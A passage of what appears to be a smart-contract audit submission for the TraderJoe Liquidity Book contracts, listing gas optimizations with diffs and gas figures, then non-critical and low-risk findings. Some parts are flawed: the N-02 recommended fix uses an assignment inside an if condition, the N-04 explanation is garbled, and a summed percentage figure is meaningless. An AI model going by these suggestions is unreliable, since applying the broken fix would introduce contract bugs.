-67,10 +65,8 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);          vm.expectEmit(true, true, true, true); @@ -99,7 +95,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -114,7 +109,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -130,7 +124,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -163,7 +156,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -195,7 +187,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount - 1);          for (uint256 i; i < binAmount - 1; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -244,7 +235,6 @@ contract LiquidityBinTokenTest is TestHelper {          (_ids, , , ) = addLiquidity(amountIn, _startId, binAmount, _gap);          uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }          batchBalances = pair.balanceOfBatch(accounts, _ids); ```  ### Gas savings  Below is the output of `forge snapshot --diff | tail -65` converted to CSV. Especially see `testInternalBurn` and `testInternalMint` functions showing greater than 50% savings.  ```csv Test Function,Gas Cost Difference,Percent Difference testSetLBPairImplementation(),-460002,-2.742% testConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24),-153429,-3.014% testGetSwapInOverflowReverts(),-67031,-9.004% testGetSwapOutWithMultipleChoices(),-427507,-10.436% testOracleSampleFromWith2Samples(),-67031,-12.911% testSwapYtoXSingleBinFromGetSwapIn(),-66966,-13.118% testSwapYtoXSingleBinFromGetSwapOut(),-67031,-13.449% testSwapXtoYSingleBinFromGetSwapOut(),-67031,-13.450% testSwapXtoYSingleBinFromGetSwapIn(),-67031,-13.501% testOracleSampleFromEdgeCases(),-67009,-13.970% testFuzzingAddLiquidity(uint256),-157150,-15.139% testDistributionOverflowReverts(),-134018,-15.454% testOracleSampleFromWith100Samples(),-4487757,-17.917% testClaimFeesComplex(uint256,uint256),-247423,-18.921% testForIdSlippageCaughtReverts(),-427485,-19.194% testClaimProtocolFees(),-247401,-19.862% testClaimFeesY(),-247335,-20.163% testClaimFeesX(),-247335,-20.163% testFeesOnTokenTransfer(),-284146,-20.361% testSwapWithDifferentBinSteps(),-427529,-20.375% testForAmountSlippageCaughtReverts(),-473364,-21.279% testGetSwapInWrongAmountsReverts(),-427485,-21.326% testFlawedCompositionFactor(),-359365,-21.362% testGetSwapInMoreBins(),-427031,-21.706% testInsufficientLiquidityMinted(),-359321,-21.806% testGetSwapOutOnComplexRoute(),-427464,-22.719% testGetSwapInOnComplexRoute(),-427507,-22.968% testOracleSampleFromWith100SamplesNotAllInitialized(),-4484457,-22.991% testAddLiquidityIgnored(),-428376,-23.297% testGetSwapInWithMultipleChoices(),-427507,-23.756% testSwapYtoXDistantBinsFromGetSwapOut(),-427421,-23.911% testSwapYtoXDistantBinsFromGetSwapIn(),-427421,-23.933% testBalanceOfBatch(),-256383,-24.074% testFeeOnActiveBinReverse(),-213936,-24.331% testFeeOnActiveBin(),-213936,-24.331% testSwapXtoYDistantBinsFromGetSwapOut(),-427486,-24.412% testSafeBatchTransferNotApprovedReverts(),-256343,-24.420% testSwapXtoYDistantBinsFromGetSwapIn(),-427486,-24.425% testSafeTransferNotApprovedReverts(),-256376,-24.488% testFlashloan(),-427513,-24.826% testSwapXtoYConsecutiveBinFromGetSwapOut(),-427486,-25.050% testSwapXtoYConsecutiveBinFromGetSwapIn(),-427486,-25.064% testSwapYtoXConsecutiveBinFromGetSwapOut(),-427486,-25.089% testSwapYtoXConsecutiveBinFromGetSwapIn(),-427486,-25.104% testBurnLiquidity(),-477535,-25.129% testSafeTransferFrom(),-295891,-25.295% testGetSwapOutOnV2Pair(),-427507,-26.931% testGetSwapInOnV2Pair(),-427507,-26.953% testSweepLBToken(),-489987,-27.188% testModifierCheckLength(),-535964,-28.163% testSafeTransferFromReverts(),-537662,-28.222% testForceDecay(),-2319546,-28.916% testSafeBatchTransferFromReverts(),-606907,-29.824% testAddLiquidityTaxToken(),-1076244,-29.978% testTLowerThanTimestamp(),-2319913,-30.143% testRemoveLiquidityReverseOrder(),-709108,-33.958% testAddLiquidityNoSlippage(),-709107,-33.960% testAddLiquidityAVAXReversed(),-1608674,-35.141% testAddLiquidityAVAX(),-1758599,-35.555% testSafeBatchTransferFrom(),-570685,-36.100% testRemoveLiquiditySlippageReverts(),-2670446,-42.380% testInternalBurn(uint256,uint256),-67156,-53.633% testInternalMint(uint256),-67231,-55.603% testInternalExcessiveBurnAmountReverts(uint128,uint128),-66987,-56.306% Overall,-39447398,-1550.248% ```  Note that there are other instances of enumeration in the protocol. However, they only cost gas in admin functions or during pair creation. Also they enumerate addresses. Therefore I believe them to be justified, hence I only focused on enumeration of this core protocol functionality (adding and removing liquidity). I think it is essential to remove this enumeration to improve the efficiency of the protocol. Reducing gas cost during adding or removing liquidity is of utmost importance for the optimization of this protocol, as it will make it feasible to do bin operations at greater scale.  ## [G-02] Using Solidity version 0.8.17 will provide an overall gas optimization  Using at least `0.8.10` will save gas due to skipped `extcodesize` check if there is a return value. Currently the contracts are compiled using version `0.8.7` (Foundry default). It is easily changeable to `0.8.17` using the command `sed -i 's/0\.8\.7/^0.8.0/' test/*.sol && sed -i '4isolc = "0.8.17"' foundry.toml`. This will have the following total savings obtained by `forge snapshot --diff | tail -1`:  ```csv Test Function,Gas Cost Difference,Percent Difference Overall,-582995,-88.032% ```  ## [G-03] Ternary operation is cheaper than if-else statement  There are instances where a ternary operation can be used instead of if-else statement. In these cases, using ternary operation will save modest amounts of gas.  ```diff diff --git a/src/libraries/BitMath.sol b/src/libraries/BitMath.sol index d088fdf..29c4034 100644 --- a/src/libraries/BitMath.sol +++ b/src/libraries/BitMath.sol @@ -16,9 +16,7 @@ library BitMath {          uint8 _bit,          bool _rightSide      ) internal pure returns (uint256) { -        if (_rightSide) { -            return closestBitRight(_integer, _bit - 1); -        } else return closestBitLeft(_integer, _bit + 1); +        return _rightSide ? closestBitRight(_integer, _bit - 1) : closestBitLeft(_integer, _bit + 1);      }       /// @notice Returns the most (or least) significant bit of `_integer` @@ -26,9 +24,7 @@ library BitMath {      /// @param _isMostSignificant Whether we want the most (true) or the least (false) significant bit      /// @return The index of the most (or least) significant bit      function significantBit(uint256 _integer, bool _isMostSignificant) internal pure returns (uint8) { -        if (_isMostSignificant) { -            return mostSignificantBit(_integer); -        } else return leastSignificantBit(_integer); +        return _isMostSignificant ? mostSignificantBit(_integer) : leastSignificantBit(_integer);      }       /// @notice Returns the index of the closest bit on the right of x that is non null @@ -41,10 +37,8 @@ library BitMath {              uint256 _shift = 255 - bit;              x <<= _shift;  -            if (x == 0) return type(uint256).max; - -            // can't overflow as it's non-zero and we shifted it by `_shift` -            return mostSignificantBit(x) - _shift; +            // can't underflow as it's non-zero and we shifted it by `_shift` +            return (x == 0) ? type(uint256).max : mostSignificantBit(x) - _shift;          }      }  @@ -57,9 +51,7 @@ library BitMath {          unchecked {              x >>= bit;  -            if (x == 0) return type(uint256).max; - -            return leastSignificantBit(x) + bit; +            return (x == 0) ? type(uint256).max : leastSignificantBit(x) + bit;          }      } ```  Note that this optimization seems to be dependent on usage of a more recent Solidity version. The following gas savings are on version `0.8.17`.  ```csv Test Function,Gas Cost Difference,Percent Difference Overall,-13065,-0.200% ```  ## [G-04] Checking `msg.sender` to not be zero address is redundant  There is an instance where `msg.sender` is checked not to be zero address. This check is redundant as no private key is known for this address, hence there can be no transactions coming from the zero address. The following diff removes this redundant check.  ```diff diff --git a/src/libraries/PendingOwnable.sol b/src/libraries/PendingOwnable.sol index f745362..97fb524 100644 --- a/src/libraries/PendingOwnable.sol +++ b/src/libraries/PendingOwnable.sol @@ -33,7 +33,7 @@ contract PendingOwnable is IPendingOwnable {       /// @notice Throws if called by any account other than the pending owner.      modifier onlyPendingOwner() { -        if (msg.sender != _pendingOwner || msg.sender == address(0)) revert PendingOwnable__NotPendingOwner(); +        if (msg.sender != _pendingOwner) revert PendingOwnable__NotPendingOwner();          _;      }   ```  This will save tiny amounts of gas when `PendingOwnable.becomeOwner()` is called.  ## [G-05] An element is cached to memory after it is used  Caching a struct element locally should be done before using it to save gas. The following diff applies this optimization.  ```diff diff --git a/src/LBPair.sol b/src/LBPair.sol index 717270e..1d29c39 100644 --- a/src/LBPair.sol +++ b/src/LBPair.sol @@ -316,8 +316,8 @@ contract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {          if (_amountIn == 0) revert LBPair__InsufficientAmounts();           FeeHelper.FeeParameters memory _fp = _feeParameters; -        _fp.updateVariableFeeParameters(_pair.activeId);          uint256 _startId = _pair.activeId; +        _fp.updateVariableFeeParameters(_startId);           uint256 _amountOut;          // Performs the actual swap, bin per bin ```  This will save small amount of gas when swapping.  ```csv Test Function,Gas Cost Difference,Percent Difference testSwapExactTokensForTokensSinglePair(),-30,-0.009% ```  ## [G-06] Divisions by `2**n` can be replaced by right shift by `n`  There is an instance of division by `2`, which can be replaced by right shift by `1`. This simple bit operation is always cheaper than division. The following diff applies this optimization.  ```diff diff --git a/src/libraries/Oracle.sol b/src/libraries/Oracle.sol index 974bc9f..fd9ca64 100644 --- a/src/libraries/Oracle.sol +++ b/src/libraries/Oracle.sol @@ -159,7 +159,7 @@ library Oracle {          uint256 _sampleTimestamp;          while (_high >= _low) {              unchecked { -                _middle = (_low + _high) / 2; +                _middle = (_low + _high) >> 1;                  assembly {                      _id := addmod(_middle, _index, _activeSize)                  } ```  Gas savings are obtained by `forge snapshot --diff`.  ```csv Test Function,Gas Cost Difference,Percent Difference testOracleSampleFromWith2Samples(),-4,-0.001% testOracleSampleFromWith100SamplesNotAllInitialized(),-452,-0.002% testFuzzingAddLiquidity(uint256),30,0.003% testOracleSampleFromWith100Samples(),-1320,-0.005% Overall,-1746,-0.005% ```  ## [G-07] Runtime cost can be optimized in detriment of the deploy cost  There are two optimization to improve runtime cost. Although the following optimizations will increase the gas cost of new pair creation and certain admin functions, it will decrease runtime cost of core protocol functions (swap, add/remove liquidity). Given that a pair is created once, but thousands of operations are made on it, optimizing for runtime can save a lot of gas in the long term.  ### [G-07A] Storing `LBFactory._LBPairsInfo` info in both sorting order will save gas in runtime  When `LBFactory.createLBPair()` is called, the pair information can be stored in both sorting orders of its reserve tokens. This will allow skipping [`_sortTokens()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L607-L611), reducing the gas cost of [`_getLBPairInformation()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L593-L600).  ```diff diff --git a/src/LBFactory.sol b/src/LBFactory.sol index 32ee39c..7c66fbf 100644 --- a/src/LBFactory.sol +++ b/src/LBFactory.sol @@ -183,9 +183,7 @@ contract LBFactory is PendingOwnable, ILBFactory {          returns (LBPairInformation[] memory LBPairsAvailable)      {          unchecked { -            (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY); - -            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenA][_tokenB]; +            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenX][_tokenY];              uint256 _nbAvailable = _avLBPairBinSteps.decode(type(uint8).max, 248);                if (_nbAvailable > 0) { @@ -194,7 +192,7 @@ contract LBFactory is PendingOwnable, ILBFactory {                  uint256 _index;                  for (uint256 i = MIN_BIN_STEP; i <= MAX_BIN_STEP; ++i) {                      if (_avLBPairBinSteps.decode(1, i) == 1) { -                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i]; +                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][i];                            LBPairsAvailable[_index] = LBPairInformation({                              binStep: i.safe24(), @@ -273,6 +271,12 @@ contract LBFactory is PendingOwnable, ILBFactory {              createdByOwner: msg.sender == _owner,              ignoredForRouting: false          }); +        _LBPairsInfo[_tokenB][_tokenA][_binStep] = LBPairInformation({ +            binStep: _binStep, +            LBPair: _LBPair, +            createdByOwner: msg.sender == _owner, +            ignoredForRouting: false +        });            allLBPairs.push(_LBPair);   @@ -286,6 +290,7 @@ contract LBFactory is PendingOwnable, ILBFactory {                // Save the changes              _availableLBPairBinSteps[_tokenA][_tokenB] = _avLBPairBinSteps; +            _availableLBPairBinSteps[_tokenB][_tokenA] = _avLBPairBinSteps;          }            emit LBPairCreated(_tokenX, _tokenY, _binStep, _LBPair, allLBPairs.length - 1); @@ -315,14 +320,13 @@ contract LBFactory is PendingOwnable, ILBFactory {          uint256 _binStep,          bool _ignored      ) external override onlyOwner { -        (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY); - -        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][_binStep]; +        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][_binStep];          if (address(_LBPairInformation.LBPair) == address(0)) revert LBFactory__AddressZero();            if (_LBPairInformation.ignoredForRouting == _ignored) revert LBFactory__LBPairIgnoredIsAlreadyInTheSameState();   -        _LBPairsInfo[_tokenA][_tokenB][_binStep].ignoredForRouting = _ignored; +        _LBPairsInfo[_tokenX][_tokenY][_binStep].ignoredForRouting = _ignored; +        _LBPairsInfo[_tokenY][_tokenX][_binStep].ignoredForRouting = _ignored;            emit LBPairIgnoredStateChanged(_LBPairInformation.LBPair, _ignored);      } @@ -595,7 +599,6 @@ contract LBFactory is PendingOwnable, ILBFactory {          IERC20 _tokenB,          uint256 _binStep      ) private view returns (LBPairInformation memory) { -        (_tokenA, _tokenB) = _sortTokens(_tokenA, _tokenB);          return _LBPairsInfo[_tokenA][_tokenB][_binStep];      }   ```  ### [G-07B] Using CREATE2 is cheaper than Clones  Using clone contracts requires extra proxy call, increasing the cost of all pair functions. Using CREATE2, although will increase cost of pair creation, will make all pair interactions cheaper.  ## [G-08] Making constant variables private will save gas during deployment  When constants are marked public, extra getter functions are created, increasing the deployment cost. Marking these functions private will decrease gas cost. One can still read these variables through the source code. If they need to be accessed by an external contract, a separate single getter function can be used to return all constants as a tuple. There [are four instances of public constants](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L25-L30).  ```solidity src/LBFactory.sol:25:    uint256 public constant override MAX_FEE = 0.1e18; // 10% src/LBFactory.sol:27:    uint256 public constant override MIN_BIN_STEP = 1; // 0.01% src/LBFactory.sol:28:    uint256 public constant override MAX_BIN_STEP = 100; // 1%, can't be greater than 247 for indexing reasons src/LBFactory.sol:30:    uint256 public constant override MAX_PROTOCOL_SHARE = 2_500; // 25% ```  ## [G-09] Using `bool`s for storage incurs overhead  *Credit: Description by [IllIllI000](https://gist.github.com/IllIllI000)*.  ```     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess ([**100 gas**](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.  There are 2 instances of this issue:  ```solidity src/LBFactory.sol-38-    /// @notice Whether the createLBPair function is unlocked and can be called by anyone (true) or only by owner (false) src/LBFactory.sol:39:    bool public override creationUnlocked; -- src/LBToken.sol-20-    /// @dev Mapping from account to spender approvals src/LBToken.sol:21:    mapping(address => mapping(address => bool)) private _spenderApprovals; ```  ## [G10] Functions guaranteed to revert when called by normal users can be marked `payable`  *Credit: Description by [IllIllI000](https://gist.github.com/IllIllI000)*.  If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  There are 14 instances of this:  ```solidity src/libraries/PendingOwnable.sol:59:    function setPendingOwner(address pendingOwner_) public override onlyOwner { src/libraries/PendingOwnable.sol:68:    function revokePendingOwner() public override onlyOwner { src/libraries/PendingOwnable.sol:84:    function renounceOwnership() public override onlyOwner { src/LBFactory.sol:215:    function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner { src/LBFactory.sol:317:    ) external override onlyOwner { src/LBFactory.sol:350:    ) external override onlyOwner { src/LBFactory.sol:396:    function removePreset(uint16 _binStep) external override onlyOwner { src/LBFactory.sol:434:    ) external override onlyOwner { src/LBFactory.sol:468:    function setFeeRecipient(address _feeRecipient) external override onlyOwner { src/LBFactory.sol:474:    function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner { src/LBFactory.sol:485:    function setFactoryLockedState(bool _locked) external override onlyOwner { src/LBFactory.sol:493:    function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner { src/LBFactory.sol:502:    function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner { src/LBFactory.sol:520:    function forceDecay(ILBPair _LBPair) external override onlyOwner { ```
### Non-Critical Issues List | Number |Issues Details|Context| |:--:|:-------|:--:| | [N-01 ]| Insufficient coverage file | | | [N-02] |Argument assignment architecture of setFactoryLockedState function may cause error|1| | [N-03] | `0` address check | 6 | | [N-04] | Use `require` instead of `assert` | 1 | | [N-05] | For modern and more readable code; update import usages | All contracts | | [N-06] | `Empty blocks` should be _removed_ or _Emit_ something | 1 | | [N-07] | `Function writing` that does not comply with the `Solidity Style Guide`| 5 | | [N-08] | Compliance with Solidity Style rules in Constant expressions | 2 | | [N-09] | Omissions in Events |  | | [N-10] | Need Fuzzing test |  | | [N-11] |Use a more recent version of Solidity | All contracts | | [N-12] | Solidity compiler optimizations can be problematic | 1 |  Total 12 issues   ### Low Risk Issues List | Number |Issues Details|Context |:--:|:-------|:--:| |[L-01]| Use ```safeTransferOwnership``` instead of ```transferOwnership``` function | 1 | |[L-02]| Owner can renounce Ownership| 1 | |[L-03]| Use a more recent version of OpenZeppelin dependencies | All contracts | |[L-04]| WAWAX address definition can be use directly | 1 | |[L-05]| 2 step changes for privileged contract addresses | 1 |  Total 5 issues  ### Suggestions | Number | Suggestion Details | |:--:|:-------| | [S-01] |Add to _blacklist function_ | | [S-02] | Generate perfect code headers every time |  Total 2 suggestions    ### [N-01] Insufficient coverage  **Description:** The test coverage rate of the project is 63%. Testing all functions is best practice in terms of security criteria. ```js +-------------+-------------------+--------------------+-------------------+------------------+ | File        | % Lines           | % Statements       | % Branches        | % Funcs          | +=============================================================================================+ | Total       | 62.23% (850/1366) | 63.67% (1069/1679) | 49.09% (296/603)  | 55.42% (138/249) | +-------------+-------------------+--------------------+-------------------+------------------+  ``` Due to its capacity, test coverage is expected to be 100%  ### [N-02] Argument assignment architecture of setFactoryLockedState function may cause error  **Context:** [LBFactory.sol#L485](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L485)  **Description:** The setFactoryLockedState function replaces the "creationUnlocked bool" value. But it reverses the result with value input  For example ; When you set the _locked argument to true , creationUnlocked gets false When you set the _locked argument to false , creationUnlocked gets true  The opposite of the desired value and the required value may cause an error.  ```js  function setFactoryLockedState(bool _locked) external override onlyOwner {         if (creationUnlocked != _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();         creationUnlocked = !_locked;         emit FactoryLockedStatusUpdated(_locked);     } ```  **Recommendation:** Change the architecture so that the input and output are the same  ```js  function setFactoryLockedState(bool _locked) external override onlyOwner {         if (creationUnlocked = _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();         creationUnlocked = _locked;         emit FactoryLockedStatusUpdated(_locked);     } ```  ### [N-03] `0 address` check  **Context:** [LBQuoter.sol#L45](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L45) [LBQuoter.sol#L46](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L46) [LBQuoter.sol#L47](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L47) [LBRouter.sol#L57](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L57) [LBRouter.sol#L58](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L58) [LBRouter.sol#L59](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L59)  **Description:** Also check of the address to protect the code from 0x0 address  problem just in case. This is best practice or instead of suggesting that they verify address != 0x0, you could add some good NatSpec comments explaining what is valid and what is invalid and what are the implications of accidentally using an invalid address.  **Recommendation:** like this; `if (routerV2== address(0)) revert ADDRESS_ZERO();`   ### [N-04] Use `require` instead of `assert`  **Context:** [LBFactory.sol#L141](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L141)  **Description:** Assert should not be used except for tests, `require` should be used  Prior to Solidity 0.8.0, pressing a confirm consumes the remainder of the process's available gas instead of returning it, as request()/revert() did.  assert() and ruqire(); The big difference between the two is that the `assert()`function when false, uses up all the remaining gas and reverts all the changes made. Meanwhile, a  `require()` function when false, also reverts back all the changes made to the contract but does refund all the remaining gas fees we offered to pay.This is the most common Solidity function used by developers for debugging and error handling.  Assertion() should be avoided even after solidity version 0.8.0, because its documentation states "The Assert function generates an error of type Panic(uint256). Code that works properly should never Panic, even on invalid external input. If this happens, you need to fix it in your contract. there's a mistake".  ### [N-05] For modern and more readable code; update import usages  **Context:** All contracts  **Description:** Solidity code is also cleaner in another waythat might not be noticeable: thestruct Point. We were importing it previously with global import but not using it. ThePointstruct `polluted the source code` with an unnecessary object we were not using because we did not need it.  This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.  **Recommendation:** `import {contract1 , contract2} from "filename.sol";`  A good example from the ArtGobblers project; ```js import {Owned} from "solmate/auth/Owned.sol"; import {ERC721} from "solmate/tokens/ERC721.sol"; import {LibString} from "solmate/utils/LibString.sol"; import {MerkleProofLib} from "solmate/utils/MerkleProofLib.sol"; import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol"; import {ERC1155, ERC1155TokenReceiver} from "solmate/tokens/ERC1155.sol"; import {toWadUnsafe, toDaysWadUnsafe} from "solmate/utils/SignedWadMath.sol"; ```  ### [N-06] `Empty blocks` should be _removed_ or _Emit_ something  **Context:** [LBToken.sol#L326](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L326)  **Description:** Code contains empty block  ```js  function _beforeTokenTransfer(         address from,         address to,         uint256 id,         uint256 amount     ) internal virtual {} } ```  **Recommendation:** The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.  If the code is not upgradeable and this function is not used, remove it directly  ### [N-07] `Function writing` that does not comply with the `Solidity Style Guide`  **Context:** [LBRouter.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol) [LBFactory.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol) [LBPair.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBPair.sol) [LBRouter.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol) [LBToken.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol)  **Description:** Order of Functions; ordering helps readers identify which functions they can call and to find the constructor and fallback definitions easier. But there are contracts in the project that do not comply with this.  https://docs.soliditylang.org/en/v0.8.17/style-guide.html  Functions should be grouped according to their visibility and ordered:  - constructor - receive function (if exists) - fallback function (if exists) - external - public - internal - private - within a grouping, place theviewandpurefunctions last  ### [N-08] Compliance with Solidity Style rules in Constant expressions  **Context:** [LBToken.sol#L29](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L29) [LBToken.sol#L30](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L30)   **Recommendation:** Variables are declared asconstantutilize theUPPER_CASE_WITH_UNDERSCORESformat.  ### [N-09] Omissions in Events  Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters  The events should include the new value and old value where possible:  Events with no old value; [PendingOwnable.sol#L103](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L103)  ### [N-10] Need Fuzzing test  **Context:** 35 results - 9 files Project uncheckeds list:  ```js  39 results - 9 files  src/LBFactory.sol:   162:         unchecked {   190:         unchecked { src/LBPair.sol:   224:         unchecked {   273:         unchecked {   398:         unchecked {   495:         unchecked {   622:         unchecked {   694:         unchecked {   736:         unchecked {   793:         unchecked {   814:         unchecked {   887:         unchecked {   928:         unchecked { src/LBRouter.sol:   661:         unchecked {   777:         unchecked {   830:         unchecked {   877:         unchecked {   950:         unchecked { src/LBToken.sol:    89:          unchecked {   162:         unchecked {   189:         unchecked {   214:         unchecked {   239:         unchecked { src/libraries/BinHelper.sol:   23:           unchecked {   41:           unchecked {   54:           unchecked { src/libraries/BitMath.sol:    40:          unchecked {    57:          unchecked {    70:          unchecked {   109:         unchecked { src/libraries/FeeDistributionHelper.sol:   41:           unchecked {   54:           unchecked { src/libraries/Math128x128.sol:   46:          unchecked { src/libraries/Math512Bits.sol:    70:         unchecked {   129:        unchecked { ```  **Description:** In total 9 contracts, 39 unchecked are used, the functions used are critical. For this reason, there must be fuzzing tests in the tests of the project. Not seen in tests.  **Recommendation:** Use should fuzzing test like Echidna.  As Alberto Cuesta Canada said: _Fuzzing is not easy, the tools are rough, and the math is hard, but it is worth it. Fuzzing gives me a level of confidence in my smart contracts that I didnt have before. Relying just on unit testing anymore and poking around in a testnet seems reckless now._  https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05  ### [N-11] Use a more recent version of Solidity  **Context:** All contracts  **Description:** For security, it is best practice to use the latest Solidity version. For the security fix list in the versions; https://github.com/ethereum/solidity/blob/develop/Changelog.md   **Recommendation:** Old version of Solidity is used `(0.8.0)`, newer version can be used `(0.8.17)`  ### [N-12] Solidity compiler optimizations can be problematic  **Context:** [foundry.toml#L6](https://github.com/code-423n4/2022-10-traderjoe/blob/main/foundry.toml#L6)  ```js main/ foundry.toml#L6:  [profile.default] src = 'src' out = 'out' libs = ['lib'] optimizer = true optimizer_runs = 800 ```  **Description:** Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them.   Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG.   Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.  Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the contracts.  **Recommendation:** Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.    ### [L-01] Use ```safeTransferOwnership``` instead of ```transferOwnership``` function  **Context:** [PendingOwnable.sol#L91-L95](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L91-L95)  **Description:** ```transferOwnership``` function is used to change Ownership  Use a 2 structure transferOwnership which is safer.  ```safeTransferOwnership```,  use it is more secure due to 2-stage ownership transfer.  **Recommendation:** Use ``Ownable2Step.sol`` [Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)  ```js  /**      * @dev The new owner accepts the ownership transfer.      */     function acceptOwnership() external {         address sender = _msgSender();         require(pendingOwner() == sender, "Ownable2Step: caller is not the new owner");         _transferOwnership(sender);     } } ``` ### [L-02] Owner can renounce Ownership  